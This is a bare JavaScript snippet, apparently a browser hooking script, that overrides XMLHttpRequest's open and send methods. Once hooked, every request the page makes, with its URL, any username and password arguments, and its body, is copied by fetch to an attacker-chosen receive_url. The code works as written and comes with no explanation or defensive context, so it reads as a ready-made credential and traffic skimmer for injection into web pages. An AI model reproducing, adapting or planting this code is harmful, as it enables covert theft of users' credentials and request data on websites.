    function captureXHR(receive_url,interceptor){
        if(typeof interceptor == &#39;undefined&#39;) interceptor ={};
        XMLHttpRequest.prototype._send = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype._open = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, async, user, password){
            var a = document.createElement(&#39;a&#39;);
            a.href = url;
            url = escape(a.href);
            this.sucks = {method,url,async,user,password};
            interceptor.onopen &amp;&amp; (arguments = interceptor.onopen.apply(this,arguments)||arguments);
            this._open.apply(this,arguments);
        };
        XMLHttpRequest.prototype.send = function(data){
            this.sucks.body = data;
            interceptor.onsend &amp;&amp; (data = interceptor.onsend.call(this,data)||data);
            this._send.call(this,data);
            receive_url&amp;&amp;
            fetch(
                `${receive_url}?url=${this.sucks.url}&amp;user=${this.sucks.user}&amp;password=${this.sucks.password}`
                ,{method:this.sucks.method,body:this.sucks.body,mode:&#39;cors&#39;}
            );
        };
    }
    
